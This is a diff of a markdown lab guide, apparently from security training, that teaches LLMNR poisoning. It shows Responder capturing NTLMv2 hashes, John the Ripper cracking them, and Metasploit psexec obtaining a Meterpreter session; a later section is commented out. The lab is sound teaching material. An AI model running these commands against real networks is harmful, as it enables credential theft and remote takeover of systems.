@@ -1,81 +1,64 @@
-
-
 # Responder
 
-In this lab we are going to walk through how quickly an attacker can take advantage of a common misconfiguration to gain access to a system via a weak password.
+In this lab we are going to walk through how quickly an attacker can take advantage of a common misconfiguration to gain access to a system via a **weak** password.
 
-Specifically, we are looking to take advantage of LLMNR.  
+Specifically, we are looking to take advantage of **"LLMNR"**.  
 
-First, we will need to load our terminal and start responder.
+We will need to load our terminal and start responder.
 
-Let's get started by opening a Terminal as Administrator
+Let's get started by opening a **Kali** terminal.
 
-![](attachments/Clipboard_2020-06-12-10-36-44.png)
+![](attachments/OpeningKaliInstance.png)
 
-When you get the User Account Control Prompt, select Yes.
+Alternatively, you can click on the **Kali** icon in the taskbar.
 
-And, open a Ubuntu command prompt:
+![](attachments/TaskbarKaliIcon.png)
 
-![](attachments/Clipboard_2020-06-17-08-32-51.png)
+Let’s become root:
 
-####NOTE##### 
+<pre>sudo su -</pre>
 
-If you are having trouble with Windows Terminal, you can simply start each of the three shells, we use by starting them directly from the Windows Start button. 
+Before we start, we need to remove the existing **Responder** database. Do so by running the following:
 
- 
+<pre>rm /usr/share/responder/Responder.db</pre>
 
-Simply click the Windows Start button in the lower left of your screen and type: 
+Now let’s start **Responder**:
 
- 
+<pre>responder -I eth0</pre>
 
-`Powershell` 
+You should see this:
 
-or 
+![](attachments/responderrunning.png)
 
-`Ubuntu`
+Let's open **Windows File Explorer** and put in the string **"\\Noooo"** into the address bar at the top.
 
-or 
+![](attachments/OpeningFileExplorer.png)
 
-`Command Prompt` 
+![](attachments/noooaccessbar.png)
 
- 
+Switch back to your **Kali** terminal window.
 
-For PowerShell and Command Prompt, please right click on them and select Run As Administrator 
+After a few moments, you should see some captured data showing up.  
 
-###END NOTE###
+**Please note there may be an error.  That is OK.**
 
-Next, let’s become root:
-
-adhd@DESKTOP-I1T2G01:/mnt/c/Users/adhd$ `sudo su -`
-
-Let’s change into the Responder directory:
-
-root@DESKTOP-I1T2G01:~# `cd /opt/Responder/`
-
-And let’s start Responder:
-
-root@DESKTOP-I1T2G01:/opt/Responder# `./Responder.py -I eth0`
-
-![](attachments/Clipboard_2020-06-23-14-22-03.png)
-
-Now, let's go back to your Windows system and open Windows Explorer and put in the string \\\Noooo into the address bar.
-
-![](attachments/Clipboard_2020-06-23-14-22-57.png)
-
-Give it a few moments and you should see some capture data showing up.  Please note there may be an error.  That is OK.
+![](attachments/captureddata.png)
 
 
-![](attachments/Clipboard_2020-06-23-14-22-23.png)
 
-Next we need to kill Responder with Ctrl + c.  This will return the command prompt. 
+<!--
+
+THIS SECTION IS BEING REMOVED FOR THE TIME BEING PER JOHN
+
+Next we need to kill Responder with `Ctrl + c`.  This will return the command prompt. 
 
 Now, we need to change to the logs directory.
 
-root@DESKTOP-I1T2G01:/opt/Responder# `cd logs/`
+</pre>cd /opt/Responder/logs</pre>
 
 Once there, we will need to start John The Ripper"
 
-root@DESKTOP-I1T2G01:/opt/Responder/logs# `/opt/JohnTheRipper/run/john --format=netntlmv2 ./HTTP-NTLMv2-172.26.16.1.txt`
+</pre>/opt/JohnTheRipper/run/john --format=netntlmv2 ./HTTP-NTLMv2-172.26.16.1.txt</pre>
 Remember!  Your IP will be different!!!!
 
 
@@ -101,13 +84,13 @@ Then, Right-click on the smb.bat file and run it as Administrator:
 
 ![](attachments/SMB_bat.png)
 
-Next, let’s open a new Ubuntu Command Prompt.
+Next, let’s open a new Kali instance. The easiest way to do this is to click the Kali icon in the taskbar.
 
-![](attachments/Clipboard_2020-06-17-08-32-51.png)
+![](attachments/TaskbarKaliIcon.png)
 
 Now we are going to start up and launch Metasploit against the Windows system to get a Meterpreter session.
 
-<pre>
+</pre>
 adhd@DESKTOP-I1T2G01:/mnt/c/Users/adhd$ <b>sudo su -</b>
 [sudo] password for adhd:
 root@DESKTOP-I1T2G01:~#
@@ -139,6 +122,6 @@ msf5 exploit(windows/smb/psexec) ><b> exploit</b>
 meterpreter >
 </pre>
 Now, you can see just how bad LLMNR is!!!!
-
-
+*/
+-->
 
